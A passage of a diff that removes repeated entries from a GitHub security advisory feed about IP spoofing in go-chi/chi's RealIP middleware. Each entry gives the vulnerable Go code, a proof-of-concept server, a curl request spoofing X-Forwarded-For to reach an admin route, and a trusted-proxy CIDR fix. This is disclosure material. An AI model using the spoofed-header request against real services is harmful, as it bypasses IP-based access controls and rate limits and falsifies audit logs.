-<li>audit logs show fake ips picked by attacker instead of real ones</li>
-<li>attackers can get around geo ip restrictions</li>
-</ul>
-<h2 id="remediation-recommendation">Remediation Recommendation</h2>
-<p>validate proxy cidr first before trusting forwarded ip headers</p>
-<pre><code class="language-go">// add your reverse proxy ip addresses here
-var trustedProxies = []net.IPNet{
-       {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
-    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
-    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
-}
-
-func isTrustedProxy(ip net.IP) bool {
-    for _, cidr := range trustedProxies {
-        if cidr.Contains(ip) {
-            return true
-        }
-    }
-    return false
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-<li><a href="https://github.com/go-chi/chi/releases/tag/v5.3.0">https://github.com/go-chi/chi/releases/tag/v5.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T18:19:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/go-chi/chi/v4/middleware] chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header]]></title>
-        <id>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</id>
-        <link href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp"/>
-        <updated>2026-06-25T18:19:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>realip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls</p>
-<h3 id="details">Details</h3>
-<p>the vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy</p>
-<pre><code class="language-go">func realIP(r *http.Request) string {
-    var ip string
-    if tcip := r.Header.Get(trueClientIP); tcip != "" {
-        ip = tcip  // controlled by attacker
-    } else if xrip := r.Header.Get(xRealIP); xrip != "" {
-        ip = xrip  // controlled by attacker
-    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
-        ip, _, _ = strings.Cut(xff, ",")  // controlled by attacker
-    }
-    // ...
-    return ip
-}
-</code></pre>
-<p>no trusted proxy cidr check in place, any client can send these headers</p>
-<h3 id="poc">PoC</h3>
-<p>create a server with chi and use realip middleware</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "net/http"
-    "github.com/go-chi/chi/v5"
-    "github.com/go-chi/chi/v5/middleware"
-)
-
-func main() {
-    r := chi.NewRouter()
-    r.Use(middleware.RealIP)
-
-    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
-        // ip-based access control got bypassed
-        if r.RemoteAddr == "127.0.0.1" {
-            w.Write([]byte("SECRET ADMIN DATA"))
-            return
-        }
-        http.Error(w, "Forbidden", 403)
-    })
-
-    http.ListenAndServe(":8080", r)
-}
-</code></pre>
-<p>spoofed the ip to bypass access control</p>
-<pre><code class="language-bash">curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/admin
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>ip-based access control bypass lets attackers reach restricted endpoints</li>
-<li>rate limiting bypass lets attackers avoid limits by rotating spoofed ips</li>
-<li>audit logs show fake ips picked by attacker instead of real ones</li>
-<li>attackers can get around geo ip restrictions</li>
-</ul>
-<h2 id="remediation-recommendation">Remediation Recommendation</h2>
-<p>validate proxy cidr first before trusting forwarded ip headers</p>
-<pre><code class="language-go">// add your reverse proxy ip addresses here
-var trustedProxies = []net.IPNet{
-       {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
-    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
-    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
-}
-
-func isTrustedProxy(ip net.IP) bool {
-    for _, cidr := range trustedProxies {
-        if cidr.Contains(ip) {
-            return true
-        }
-    }
-    return false
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-<li><a href="https://github.com/go-chi/chi/releases/tag/v5.3.0">https://github.com/go-chi/chi/releases/tag/v5.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T18:19:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/go-chi/chi/v3/middleware] chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header]]></title>
-        <id>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</id>
-        <link href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp"/>
-        <updated>2026-06-25T18:19:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>realip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls</p>
-<h3 id="details">Details</h3>
-<p>the vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy</p>
-<pre><code class="language-go">func realIP(r *http.Request) string {
-    var ip string
-    if tcip := r.Header.Get(trueClientIP); tcip != "" {
-        ip = tcip  // controlled by attacker
-    } else if xrip := r.Header.Get(xRealIP); xrip != "" {
-        ip = xrip  // controlled by attacker
-    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
-        ip, _, _ = strings.Cut(xff, ",")  // controlled by attacker
-    }
-    // ...
-    return ip
-}
-</code></pre>
-<p>no trusted proxy cidr check in place, any client can send these headers</p>
-<h3 id="poc">PoC</h3>
-<p>create a server with chi and use realip middleware</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "net/http"
-    "github.com/go-chi/chi/v5"
-    "github.com/go-chi/chi/v5/middleware"
-)
-
-func main() {
-    r := chi.NewRouter()
-    r.Use(middleware.RealIP)
-
-    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
-        // ip-based access control got bypassed
-        if r.RemoteAddr == "127.0.0.1" {
-            w.Write([]byte("SECRET ADMIN DATA"))
-            return
-        }
-        http.Error(w, "Forbidden", 403)
-    })
-
-    http.ListenAndServe(":8080", r)
-}
-</code></pre>
-<p>spoofed the ip to bypass access control</p>
-<pre><code class="language-bash">curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/admin
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>ip-based access control bypass lets attackers reach restricted endpoints</li>
-<li>rate limiting bypass lets attackers avoid limits by rotating spoofed ips</li>
-<li>audit logs show fake ips picked by attacker instead of real ones</li>
-<li>attackers can get around geo ip restrictions</li>
-</ul>
-<h2 id="remediation-recommendation">Remediation Recommendation</h2>
-<p>validate proxy cidr first before trusting forwarded ip headers</p>
-<pre><code class="language-go">// add your reverse proxy ip addresses here
-var trustedProxies = []net.IPNet{
-       {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
-    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
-    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
-}
-
-func isTrustedProxy(ip net.IP) bool {
-    for _, cidr := range trustedProxies {
-        if cidr.Contains(ip) {
-            return true
-        }
-    }
-    return false
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-<li><a href="https://github.com/go-chi/chi/releases/tag/v5.3.0">https://github.com/go-chi/chi/releases/tag/v5.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T18:19:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/go-chi/chi/v2/middleware] chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header]]></title>
-        <id>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</id>
-        <link href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp"/>
-        <updated>2026-06-25T18:19:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>realip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls</p>
-<h3 id="details">Details</h3>
-<p>the vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy</p>
-<pre><code class="language-go">func realIP(r *http.Request) string {
-    var ip string
-    if tcip := r.Header.Get(trueClientIP); tcip != "" {
-        ip = tcip  // controlled by attacker
-    } else if xrip := r.Header.Get(xRealIP); xrip != "" {
-        ip = xrip  // controlled by attacker
-    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
-        ip, _, _ = strings.Cut(xff, ",")  // controlled by attacker
-    }
-    // ...
-    return ip
-}
-</code></pre>
-<p>no trusted proxy cidr check in place, any client can send these headers</p>
-<h3 id="poc">PoC</h3>
-<p>create a server with chi and use realip middleware</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "net/http"
-    "github.com/go-chi/chi/v5"
-    "github.com/go-chi/chi/v5/middleware"
-)
-
-func main() {
-    r := chi.NewRouter()
-    r.Use(middleware.RealIP)
-
-    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
-        // ip-based access control got bypassed
-        if r.RemoteAddr == "127.0.0.1" {
-            w.Write([]byte("SECRET ADMIN DATA"))
-            return
-        }
-        http.Error(w, "Forbidden", 403)
-    })
-
-    http.ListenAndServe(":8080", r)
-}
-</code></pre>
-<p>spoofed the ip to bypass access control</p>
-<pre><code class="language-bash">curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/admin
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>ip-based access control bypass lets attackers reach restricted endpoints</li>
-<li>rate limiting bypass lets attackers avoid limits by rotating spoofed ips</li>
-<li>audit logs show fake ips picked by attacker instead of real ones</li>
-<li>attackers can get around geo ip restrictions</li>
-</ul>
-<h2 id="remediation-recommendation">Remediation Recommendation</h2>
-<p>validate proxy cidr first before trusting forwarded ip headers</p>
-<pre><code class="language-go">// add your reverse proxy ip addresses here
-var trustedProxies = []net.IPNet{
-       {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
-    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
-    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
-}
-
-func isTrustedProxy(ip net.IP) bool {
-    for _, cidr := range trustedProxies {
-        if cidr.Contains(ip) {
-            return true
-        }
-    }
-    return false
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-<li><a href="https://github.com/go-chi/chi/releases/tag/v5.3.0">https://github.com/go-chi/chi/releases/tag/v5.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp">https://github.com/advisories/GHSA-rjr7-jggh-pgcp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T18:19:15.000Z</published>
     </entry>
 </feed>
